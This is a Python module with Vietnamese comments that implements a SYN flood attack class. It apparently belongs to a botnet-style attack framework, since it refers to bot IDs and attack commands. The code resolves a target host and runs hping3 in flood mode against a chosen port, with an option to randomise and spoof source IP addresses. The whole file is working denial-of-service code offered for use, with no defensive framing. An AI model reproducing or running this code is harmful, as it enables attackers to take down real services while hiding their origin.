import asyncio
import subprocess
import logging
from urllib.parse import urlparse
from .base import BaseAttack

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

class SYNFlood(BaseAttack):
    async def execute(self):
        """Thực thi cuộc tấn công SYN Flood bằng hping3."""
        logging.info(f"Bot {self.bot_id} bắt đầu tấn công với attack_id: {self.attack_id}")
        
        # Đảm bảo target_url có '/' ở cuối khi log
        # target_url = self.target.rstrip('/') + '/'
        
        # Lấy IP từ target_url
        try:
            parsed_url = urlparse(self.target)
            target_ip = parsed_url.hostname
            if not target_ip:
                logging.error("Không thể phân tích IP từ target_url")
                return
        except Exception as e:
            logging.error(f"Lỗi khi phân tích target_url: {e}")
            return

        # Lấy target_port từ kwargs
        target_port = self.kwargs.get("target_port")
        if not target_port:
            logging.error("Thiếu target_port trong attack_command")
            return

        # Tính tổng số gói tin
        total_packets = int(self.intensity * self.duration)
        
        # Xây dựng lệnh hping3
        command = [
            "hping3",
            "--syn",              # Gửi gói SYN
            "-c", str(total_packets),  # Tổng số gói
            "-d", "120",          # Kích thước dữ liệu (bytes)
            "-p", str(target_port),  # Port đích
            "--flood",            # Gửi nhanh nhất có thể
            target_ip
        ]
        if self.kwargs.get("spoof_ip", False):
            command.insert(1, "--rand-source")  # Giả mạo IP nguồn

        logging.info(f"Chạy lệnh hping3: {' '.join(command)}")
        try:
            process = await asyncio.create_subprocess_exec(
                *command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            await asyncio.sleep(self.duration)
            process.terminate()
            stdout, stderr = await process.communicate()
            logging.info(f"Kết quả SYN Flood: {stdout.decode()}")
            if stderr:
                logging.error(f"Lỗi SYN Flood: {stderr.decode()}")
        except Exception as e:
            logging.error(f"Lỗi khi chạy SYN Flood: {e}")